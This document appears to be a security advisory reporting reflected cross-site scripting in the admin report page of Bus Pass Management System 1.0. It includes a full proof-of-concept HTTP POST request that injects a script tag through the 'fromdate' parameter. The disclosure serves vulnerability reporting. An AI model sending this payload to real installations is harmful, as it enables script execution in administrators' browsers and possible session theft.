# Bus_management
Bus Pass Management System Using PHP and MySQL 1.0

# Auditor:
Shouvik Dutta <a href="https://www.linkedin.com/in/shouvik-dutta/">@shouvik_dutta</a>

# Description: 
Cross-site Scripting detected in Bus Pass Management System Project 1.0

Admin Panel - Report of Pass Page is vulnerable to Cross-Site Scripting

The web application application includes improperly sanitized user input in the admin page specifically at `fromdate` & `todate` parameter at the /pass-bwdates-reports-details.php endpoint output it generates. This can lead to the execution of arbitrary scripts in the context of the victim's browser when they interact with a maliciously crafted link.

Vulnerable Endpoint - /pass-bwdates-reports-details.php
Vulnerable Parameter - `fromdate` & `todate`

# PoCs

`Vulnerable URL: /admin/pass-bwdates-reports-details.php`

`POST Request`
`
POST /admin/pass-bwdates-reports-details.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://localhost
Connection: close
Referer: http://localhost/admin/pass-bwdates-report.php
Cookie: PHPSESSID=kful63rkjq5nk1ordm2tm9keg6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
`
fromdate=<script>alert(1)</script>&todate=1111-11-11&submit=
